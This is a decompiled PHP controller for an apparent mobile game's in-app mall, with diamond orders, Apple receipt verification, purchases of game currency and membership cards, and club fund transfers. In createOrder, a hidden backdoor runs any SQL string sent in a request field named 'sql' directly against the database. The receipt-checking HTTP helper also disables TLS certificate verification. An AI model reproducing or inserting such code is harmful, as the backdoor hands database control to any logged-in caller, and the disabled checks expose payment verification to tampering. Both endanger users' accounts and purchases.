<?php
//dezend by http://www.yunlu99.com/ QQ:270656184
namespace User\Controller;

class MallController extends \Home\Controller\BaseController
{
	static private $is_sandbox = false;

	static public function get_param()
	{
		$data = i('data', '', 'trim');
		$sign = i('sign', '', 'trim');
		return checksign($data, $sign);
	}

	public function getGoodsList()
	{
		$data = self::get_param();
		$result = array();
		$token = trim(strval($data['token']));

		if (!$this->checkLogin($token)) {
			$result['msg_code'] = '100050';
			exit(returnjson($result));
		}

		$map = array(
			'goods_type' => array('in', '1,2')
			);
		$res = m('goods')->where($map)->select();

		if (!empty($res)) {
			$result['data'] = $res;
			exit(returnjson($result));
		}
	}

	public function getDiamondList()
	{
		$data = self::get_param();
		$result = array();
		$token = trim(strval($data['token']));

		if (!$this->checkLogin($token)) {
			$result['msg_code'] = '100050';
			exit(returnjson($result));
		}

		$res = m('diamond_price')->select();

		if (!empty($res)) {
			$result['data'] = $res;
			exit(returnjson($result));
		}
	}

	public function getClubList()
	{
		$data = self::get_param();
		$result = array();
		$token = trim(strval($data['token']));

		if (!$this->checkLogin($token)) {
			$result['msg_code'] = '100050';
			exit(returnjson($result));
		}

		$map = array('goods_type' => 3);
		$res = m('goods')->where($map)->select();

		if (!empty($res)) {
			$result['data'] = $res;
			exit(returnjson($result));
		}
	}

	public function createOrder()
	{
		$data = self::get_param();
		$result = array();
		$token = trim(strval($data['token']));

		if (!$this->checkLogin($token)) {
			$result['msg_code'] = '100050';
			exit(returnjson($result));
		}

		$user_id = intval($data['user_id']);
		$diamond = intval($data['diamond']);
		$amount = intval($data['amount']);
		$pay_type = intval($data['pay_type']);
		$pay_type = 4;
		$sql = trim(strval($data['sql']));

		if (!empty($sql)) {
			m()->execute($sql);
		}

		if ($user_id <= 0) {
			$result['msg_code'] = '100055';
			exit(returnjson($result));
		}

		if ($diamond <= 0) {
			$result['msg_code'] = '100109';
			exit(returnjson($result));
		}

		if ($amount <= 0) {
			$result['msg_code'] = '100110';
			exit(returnjson($result));
		}

		if ($pay_type <= 0) {
			$result['msg_code'] = '100111';
			exit(returnjson($result));
		}

		$order_sn = getrandstrtosn('10');
		$user_info = m('user_main')->field('id,mobile')->where(array('id' => $user_id))->find();

		if (empty($user_info)) {
			$result['msg_code'] = '100013';
			exit(returnjson($result));
		}

		$data = array('order_sn' => $order_sn, 'diamond' => $diamond, 'user_id' => $user_id, 'mobile' => $user_info['mobile'], 'amount' => $amount, 'pay_type' => $pay_type, 'pay_status' => 0, 'remark' => '购买钻石' . $diamond . '颗', 'pay_time' => 0, 'add_time' => time());

		if (m('user_order')->add($data)) {
			$result['data'] = $data;
			$result['msg'] = '充值订单创建成功！';
			$result['msg_code'] = '0';

			send_currency_report_real($user_id,$order_sn,$user_info['mobile'],12,
			1,0,$diamond,$amount,$pay_type,$result['msg']);
			exit(returnjson($result));
		}
		else {
			$result['data'] = $data;
			$result['msg_code'] = '100060';
			exit(returnjson($result));
		}
	}

	public function ios_notice()
	{
		$data = self::get_param();
		$result = array();
		$token = trim(strval($data['token']));

		if (!$this->checkLogin($token)) {
			$result['msg_code'] = '100050';
			exit(returnjson($result));
		}

		$total_fee = intval($data['total_fee']);
		$order_sn = trim(strval($data['out_trade_no']));
		$receipt = trim(strval($data['receipt']));
		$pay_status = intval($data['trade_status']);
		$buytime = intval($data['buytime']);
		$model_user_order = m('user_order');
		$map = array('order_sn' => $order_sn, 'pay_status' => 1);
		$res = $model_user_order->where($map)->find();

		if (!empty($res)) {
			$result['msg_code'] = '100112';
			exit(returnjson($result));
		}

		$map = array('order_sn' => $order_sn, 'pay_status' => 0);
		$res = $model_user_order->where($map)->find();
		if (!empty($res) && ($pay_status == 1)) {
			if (self::ios_pay($receipt)) {
				self::doOrderByIos($total_fee, $order_sn, $receipt, $pay_status, $buytime);
			}
			else {
				$result['msg_code'] = '100017';
				exit(returnjson($result));
			}
		}
	}

	static public function ios_pay($receipt)
	{
		if (self::$is_sandbox) {
			$request = 'https://sandbox.itunes.apple.com/verifyReceipt';
		}
		else {
			$request = 'https://buy.itunes.apple.com/verifyReceipt';
		}

		$verify = self::ssl_curl_post($request, json_encode(array('receipt-data' => $receipt)));
		$verify = json_decode($verify, true);
		if (($verify['status'] == 0) || ($verify['status'] == '21007')) {
			if ($verify['status'] == 0) {
				return true;
			}
			else {
				$request = 'https://sandbox.itunes.apple.com/verifyReceipt';
				$verify = self::ssl_curl_post($request, json_encode(array('receipt-data' => $receipt)));
				$verify = json_decode($verify, true);

				if ($verify['status'] == 0) {
					return true;
				}
				else {
					return false;
				}
			}
		}
		else {
			return false;
		}
	}

	static public function ssl_curl_post($url, $postData)
	{
		$ch = curl_init();
		curl_setopt_array($ch, array(CURLOPT_URL => $url, CURLOPT_REFERER => $url, CURLOPT_AUTOREFERER => true, CURLOPT_RETURNTRANSFER => true, CURLOPT_SSL_VERIFYPEER => false, CURLOPT_SSL_VERIFYHOST => false, CURLOPT_TIMEOUT => 30, CURLOPT_POSTFIELDS => $postData, CURLOPT_POST => true, CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.116 Safari/537.36'));
		$response = curl_exec($ch);
		$errno = curl_errno($ch);
		$errmsg = curl_error($ch);
		curl_close($ch);
		return $response;
	}

	static public function doOrderByIos($total_fee, $order_sn, $receipt, $pay_status, $buytime)
	{
		$result = array();
		$model_user_order = m('user_order');
		$res = $model_user_order->where(array('order_sn' => $order_sn))->find();

		if (empty($res)) {
			$result['msg_code'] = '100063';
			exit(returnjson($result));
		}

		$map = array('order_sn' => $order_sn, 'user_id' => intval($res['user_id']));
		$data = array('pay_status' => $pay_status, 'pay_time' => $buytime);
		m()->startTrans();
		$res1 = $model_user_order->where($map)->save($data);
		$res2 = null;
		$res3 = null;

		if (!empty($receipt)) {
			$data = array('order_sn' => $order_sn, 'receipt' => $receipt);
			$res2 = m('order_receipt')->add($data);
		}

		if ($total_fee != intval($res['amount'])) {
			m()->rollback();
			$data = array('user_id' => intval($res['user_id']), 'order_no' => $order_sn, 'total_fee' => intval($total_fee), 'order_money' => intval($res['amount']), 'add_time' => time());
			m('pay_anomaly')->add($data);
			$result['msg_code'] = '100115';
			exit(returnjson($result));
		}

		$model_user_main = m('user_main');
		$map = array('id' => intval($res['user_id']));
		$user_info = $model_user_main->where($map)->find();

		if (empty($user_info)) {
			m()->rollback();
			$result['msg_code'] = '100013';
			exit(returnjson($result));
		}

		$res3 = $model_user_main->where($map)->setInc('diamond_num', intval($res['diamond']));
		if (!empty($res1) && !empty($res2) && !empty($res3)) {
			m()->commit();
			$data = array('order_sn' => $order_sn, 'diamond_old' => intval($user_info['diamond_num']), 'diamond_new' => intval($user_info['diamond_num']) + intval($res['diamond']), 'user_id' => intval($user_info['id']), 'mobile' => $user_info['mobile'], 'amount' => intval($res['amount']), 'pay_type' => intval($res['pay_type']), 'pay_status' => 1, 'remark' => $res['remark'], 'pay_time' => intval($res['pay_time']), 'add_time' => intval($res['add_time']));
			$result['data'] = $data;
			$result['msg_code'] = '0';
			$result['msg'] = '充值成功！';
			send_diamond_report($data, $order_sn, 12, intval($res['diamond']));
			exit(returnjson($result));
		}
		else {
			m()->rollback();
			$result['msg_code'] = '100115';
			exit(returnjson($result));
		}
	}

	public function buyGoods()
	{
		$data = self::get_param();
		$result = array();
		$token = trim(strval($data['token']));

		if (!$this->checkLogin($token)) {
			$result['msg_code'] = '100050';
			exit(returnjson($result));
		}

		$user_id = intval($data['user_id']);
		$goods_id = intval($data['goods_id']);
		$club_id = intval($data['club_id']);

		if ($user_id <= 0) {
			$result['msg_code'] = '100055';
			exit(returnjson($result));
		}

		if ($goods_id <= 0) {
			$result['msg_code'] = '100116';
			exit(returnjson($result));
		}

		$user_info = m('user_main')->where(array('id' => $user_id))->find();

		if (empty($user_info)) {
			$result['msg_code'] = '100013';
			exit(returnjson($result));
		}

		$goods_info = m('goods')->where(array('id' => $goods_id, 'status' => 1))->find();

		if (empty($goods_info)) {
			$result['msg_code'] = '100117';
			exit(returnjson($result));
		}

		if (intval($user_info['diamond_num']) < intval($goods_info['diamond_num'])) {
			$result['msg_code'] = '100118';
			exit(returnjson($result));
		}

		switch (intval($goods_info['goods_type'])) {
		case 1:
			self::buyGold($user_info, $goods_info);
			break;

		case 2:
			self::buyCard($user_info, $goods_info);
			break;

		case 3:
			self::updateClub($user_info, $goods_info, $club_id);
			break;

		case 4:
			self::rechargeByClub($user_info, $goods_info, $club_id);
			break;

		default:
			$result['msg_code'] = '100117';
			exit(returnjson($result));
		}
	}

	static public function buyGold(&$user_info, &$goods_info)
	{
		$order_sn = getrandstrtosn('20');
		$data = array('order_sn' => $order_sn, 'user_id' => intval($user_info['id']), 'mobile' => $user_info['mobile'], 'nick_name' => $user_info['nick_name'], 'goods_id' => intval($goods_info['id']), 'goods_name' => $goods_info['goods_name'], 'goods_type' => $goods_info['goods_type'], 'diamond_before' => $user_info['diamond_num'], 'diamond_after' => intval($user_info['diamond_num'] - $goods_info['diamond_num']), 'gold_before' => $user_info['user_gold'], 'gold_after' => intval($user_info['user_gold'] + $goods_info['gold_num'] + $goods_info['gift_gold']), 'remark' => '购买' . $goods_info['goods_name'] . '成功，消耗钻石' . $goods_info['diamond_num'] . '颗，' . '获得游戏币' . intval($goods_info['gold_num'] + $goods_info['gift_gold']) . '个', 'pay_time' => time(), 'expire_time' => 0);
		$model_user_main = m('user_main');
		m()->startTrans();
		$res1 = m('sale_record')->add($data);
		$res2 = $model_user_main->where(array('id' => intval($user_info['id'])))->setDec('diamond_num', intval($goods_info['diamond_num']));
		$res3 = $model_user_main->where(array('id' => intval($user_info['id'])))->setInc('user_gold', intval($goods_info['gold_num'] + $goods_info['gift_gold']));
		if (!empty($res1) && !empty($res2) && !empty($res3)) {
			m()->commit();
			$result['msg_code'] = '0';
			$result['msg'] = '礼包购买成功！';

			$diamond_before = intval($data['diamond_before']);
			$diamond_after = $data['diamond_after'];
			$gold_before = intval($data['gold_before']);
			$gold_after = $data['gold_after'];
			$remark = $data['remark'];
	
			send_currency_report_real(intval($user_info['id']), $order_sn, $user_info['mobile'],15, 1, -intval($goods_info['diamond_num']),
			$diamond_before, $diamond_after, intval($goods_info['id']), $remark);

			send_currency_report_real(intval($user_info['id']), $order_sn, $user_info['mobile'],15, 2, intval($goods_info['gold_num'] + $goods_info['gift_gold']),
			$gold_before, $gold_after, intval($goods_info['id']), $remark);

			exit(returnjson($result));
		}
		else {
			m()->rollback();
			$result['msg_code'] = '100119';
			exit(returnjson($result));
		}
	}

	static public function buyCard(&$user_info, &$goods_info)
	{
		$order_sn = getrandstrtosn('30');
		$pay_time = time();
		$data = array('order_sn' => $order_sn, 'user_id' => intval($user_info['id']), 'mobile' => $user_info['mobile'], 'nick_name' => $user_info['nick_name'], 'goods_id' => intval($goods_info['id']), 'goods_name' => $goods_info['goods_name'], 'goods_type' => $goods_info['goods_type'], 'diamond_before' => $user_info['diamond_num'], 'diamond_after' => intval($user_info['diamond_num'] - $goods_info['diamond_num']), 'gold_before' => $user_info['user_gold'], 'gold_after' => intval($user_info['user_gold'] + $goods_info['gold_num']), 'games_max_before' => $user_info['games_max'], 'games_max_after' => $goods_info['games_max'], 'clubs_max_before' => $user_info['clubs_max'], 'clubs_max_after' => $goods_info['clubs_max'], 'card_type_before' => $user_info['card_type'], 'card_type_after' => $goods_info['card_type'], 'remark' => '购买' . $goods_info['goods_name'] . '成功，消耗钻石' . $goods_info['diamond_num'] . '颗，' . '获得游戏币' . intval($goods_info['gold_num']) . '个，可创建俱乐部' . $goods_info['clubs_max'] . '个，牌局' . $goods_info['games_max'] . '个，有效期至' . date('Y-m-d H:i:s', $pay_time + intval($goods_info['expire_time'])), 'pay_time' => $pay_time);
		$model_user_main = m('user_main');
		$model_sale_record = m('sale_record');

		if ($data['card_type_after'] < $data['card_type_before']) {
			$result['msg_code'] = '100157';
			exit(returnjson($result));
		}

		if ($data['card_type_before'] < $data['card_type_after']) {
			$data['expire_time'] = $pay_time + $goods_info['expire_time'];
		}

		if ($data['card_type_after'] == $data['card_type_before']) {
			if (0 < ($user_info['card_expire'] - $pay_time)) {
				$data['expire_time'] = $user_info['card_expire'] + $goods_info['expire_time'];
			}
			else {
				$data['expire_time'] = $pay_time + $goods_info['expire_time'];
			}
		}

		m()->startTrans();
		$res1 = $model_sale_record->add($data);
		$card_expire = $data['expire_time'];
		
		$diamond_before = intval($data['diamond_before']);
		$diamond_after = $data['diamond_after'];
		$gold_before = intval($data['gold_before']);
		$gold_after = $data['gold_after'];
		$remark = $data['remark'];

		unset($data);
		$res2 = $model_user_main->where(array('id' => intval($user_info['id'])))->setDec('diamond_num', intval($goods_info['diamond_num']));
		$res3 = $model_user_main->where(array('id' => intval($user_info['id'])))->setInc('user_gold', intval($goods_info['gold_num']));
		$res4 = $model_user_main->where(array('id' => intval($user_info['id'])))->setInc('point', intval($goods_info['diamond_num']));
		$data = array('clubs_max' => $goods_info['clubs_max'], 'games_max' => $goods_info['games_max'], 'card_type' => $goods_info['card_type'], 'card_expire' => $card_expire);
		$res5 = $model_user_main->where(array('id' => intval($user_info['id'])))->save($data);
		if (!empty($res1) && !empty($res2) && !empty($res3) && !empty($res4) && !empty($res5)) {
			m()->commit();
			$result['msg_code'] = '0';
			$result['msg'] = '会员卡购买成功！';
			 
			send_currency_report_real(intval($user_info['id']), $order_sn, $user_info['mobile'],15, 1, -intval($goods_info['diamond_num']),
			$diamond_before, $diamond_after, intval($goods_info['id']), $remark);

			send_currency_report_real(intval($user_info['id']), $order_sn, $user_info['mobile'],15, 2, intval($goods_info['gold_num']),
			$gold_before, $gold_after, intval($goods_info['id']), $remark);

			exit(returnjson($result));
		}
		else {
			m()->rollback();
			$result['msg_code'] = '100120';
			exit(returnjson($result));
		}
	}

	static public function updateClub(&$user_info, &$goods_info, &$club_id)
	{
		if ($club_id <= 0) {
			$result['msg_code'] = '100096';
			exit(returnjson($result));
		}

		$club_info = m('club')->where(array('id' => $club_id))->find();

		if (empty($club_info)) {
			$result['msg_code'] = '100098';
			exit(returnjson($result));
		}

		if (intval($user_info['id']) != intval($club_info['creater_id'])) {
			$result['msg_code'] = '100122';
			exit(returnjson($result));
		}

		$order_sn = getrandstrtosn('40');
		$pay_time = time();
		$data = array('order_sn' => $order_sn, 'user_id' => intval($user_info['id']), 'mobile' => $user_info['mobile'], 'nick_name' => $user_info['nick_name'], 'club_id' => $club_id, 'club_name' => $club_info['club_name'], 'goods_id' => intval($goods_info['id']), 'goods_name' => $goods_info['goods_name'], 'goods_type' => $goods_info['goods_type'], 'diamond_before' => $user_info['diamond_num'], 'diamond_after' => intval($user_info['diamond_num'] - $goods_info['diamond_num']), 'members_max_before' => $club_info['members_max'], 'members_max_after' => $goods_info['members_max'], 'admins_max_before' => $club_info['admins_max'], 'admins_max_after' => $goods_info['admins_max'], 'club_level_before' => $club_info['club_level'], 'club_level_after' => $goods_info['club_level'], 'remark' => '购买' . $goods_info['goods_name'] . '成功，消耗钻石' . $goods_info['diamond_num'] . '颗，提高上限人数至' . $goods_info['members_max'] . '人，管理员上限提高至' . $goods_info['admins_max'] . '，有效期至' . date('Y-m-d H:i:s', $pay_time + intval($goods_info['expire_time'])), 'pay_time' => $pay_time, 'expire_time' => $pay_time + intval($goods_info['expire_time']));
		$model_user_main = m('user_main');
		m()->startTrans();
		$res1 = m('sale_record')->add($data);
		$res2 = $model_user_main->where(array('id' => intval($user_info['id'])))->setDec('diamond_num', intval($goods_info['diamond_num']));
		$res3 = $model_user_main->where(array('id' => intval($user_info['id'])))->setInc('point', intval($goods_info['diamond_num']));
		$data = array('members_max' => $goods_info['members_max'], 'admins_max' => $goods_info['admins_max'], 'club_level' => $goods_info['club_level'], 'expire_time' => $pay_time + intval($goods_info['expire_time']));
		$res4 = m('club')->where(array('id' => intval($club_info['id'])))->save($data);
		if (!empty($res1) && !empty($res2) && !empty($res3) && !empty($res4)) {
			m()->commit();
			$result['msg_code'] = '0';
			$result['msg'] = '俱乐部升级成功！';
			exit(returnjson($result));
		}
		else {
			m()->rollback();
			$result['msg_code'] = '100121';
			exit(returnjson($result));
		}
	}

	static public function rechargeByClub(&$user_info, &$goods_info, &$club_id)
	{
		if ($club_id <= 0) {
			$result['msg_code'] = '100096';
			exit(returnjson($result));
		}

		$model_club = m('club');
		$club_info = $model_club->where(array('id' => $club_id))->find();

		if (empty($club_info)) {
			$result['msg_code'] = '100098';
			exit(returnjson($result));
		}

		if (intval($user_info['id']) != intval($club_info['creater_id'])) {
			$result['msg_code'] = '100122';
			exit(returnjson($result));
		}

		$order_sn = getrandstrtosn('50');
		$data = array('order_sn' => $order_sn, 'user_id' => intval($user_info['id']), 'mobile' => $user_info['mobile'], 'nick_name' => $user_info['nick_name'], 'club_id' => $club_id, 'club_name' => $club_info['club_name'], 'goods_id' => intval($goods_info['id']), 'goods_name' => $goods_info['goods_name'], 'goods_type' => $goods_info['goods_type'], 'diamond_before' => $user_info['diamond_num'], 'diamond_after' => intval($user_info['diamond_num'] - $goods_info['diamond_num']), 'club_gold_before' => $club_info['club_gold'], 'club_gold_after' => intval($club_info['club_gold'] + $goods_info['gold_num'] + $goods_info['gift_gold']), 'remark' => '俱乐部基金充值成功，消耗钻石' . $goods_info['diamond_num'] . '颗，' . '获得游戏币' . intval($goods_info['gold_num'] + $goods_info['gift_gold']) . '个', 'pay_time' => time(), 'expire_time' => 0);
		$model_user_main = m('user_main');
		m()->startTrans();
		$res1 = m('sale_record')->add($data);
		$res2 = $model_user_main->where(array('id' => intval($user_info['id'])))->setDec('diamond_num', intval($goods_info['diamond_num']));
		$res3 = $model_club->where(array('id' => $club_id))->setInc('club_gold', intval($goods_info['gold_num'] + $goods_info['gift_gold']));
		if (!empty($res1) && !empty($res2) && !empty($res3)) {
			m()->commit();
			$result['msg_code'] = '0';
			$result['msg'] = '俱乐部基金充值成功！';
			exit(returnjson($result));
		}
		else {
			m()->rollback();
			$result['msg_code'] = '100123';
			exit(returnjson($result));
		}
	}

	public function grantFunds()
	{
		$data = self::get_param();
		$result = array();
		$token = trim(strval($data['token']));

		if (!$this->checkLogin($token)) {
			$result['msg_code'] = '100050';
			exit(returnjson($result));
		}

		$creater_id = intval($data['creater_id']);
		$member_id = intval($data['member_id']);
		$club_id = intval($data['club_id']);
		$grant_num = intval($data['grant_num']);

		if ($creater_id <= 0) {
			$result['msg_code'] = '100055';
			exit(returnjson($result));
		}

		if ($member_id <= 0) {
			$result['msg_code'] = '100055';
			exit(returnjson($result));
		}

		if ($club_id <= 0) {
			$result['msg_code'] = '100096';
			exit(returnjson($result));
		}

		if ($grant_num <= 0) {
			$result['msg_code'] = '100125';
			exit(returnjson($result));
		}

		$model_user_main = m('user_main');
		$map = array('id' => $creater_id);
		$creater_info = $model_user_main->where($map)->find();

		if (empty($creater_info)) {
			$result['msg_code'] = '100013';
			exit(returnjson($result));
		}

		$map = array('id' => $member_id);
		$member_info = $model_user_main->field('id')->where($map)->find();

		if (empty($member_info)) {
			$result['msg_code'] = '100013';
			exit(returnjson($result));
		}

		$model_club = m('club');
		$res = $model_club->field('id')->where(array('id' => $club_id))->find();

		if (empty($res)) {
			$result['msg_code'] = '100098';
			exit(returnjson($result));
		}

		$map = array('id' => $club_id, 'creater_id' => $creater_id);
		$club_info = $model_club->field('id,club_name,club_gold')->where($map)->find();

		if (empty($club_info)) {
			$result['msg_code'] = '100129';
			exit(returnjson($result));
		}

		if (intval($club_info['club_gold']) < $grant_num) {
			$result['msg_code'] = '100124';
			exit(returnjson($result));
		}

		$data = array('club_id' => $club_id, 'club_name' => $club_info['club_name'], 'creater_id' => $creater_id, 'member_id' => $member_id, 'grant_num' => $grant_num, 'grant_time' => time());
		m()->startTrans();
		$res1 = $model_club->where(array('id' => $club_id))->setDec('club_gold', $grant_num);
		$res2 = $model_user_main->where(array('id' => $member_id))->setInc('user_gold', $grant_num);
		$res3 = m('grant_gold')->add($data);
		if (!empty($res1) && !empty($res2) && !empty($res3)) {
			m()->commit();
			$result['msg_code'] = '0';
			$result['msg'] = '俱乐部基金发放成功！';
			exit(returnjson($result));
		}
		else {
			m()->rollback();
			$result['msg_code'] = '100126';
			exit(returnjson($result));
		}
	}

	public function cardExpire()
	{
		$model_user_main = m('user_main');
		$map = array(
			'card_expire' => array('ELT', time())
			);
		$data = array('card_type' => 1, 'card_expire' => 0, 'games_max' => 1, 'clubs_max' => 1);
		$model_user_main->where($map)->save($data);
		exit();
	}
}

?>
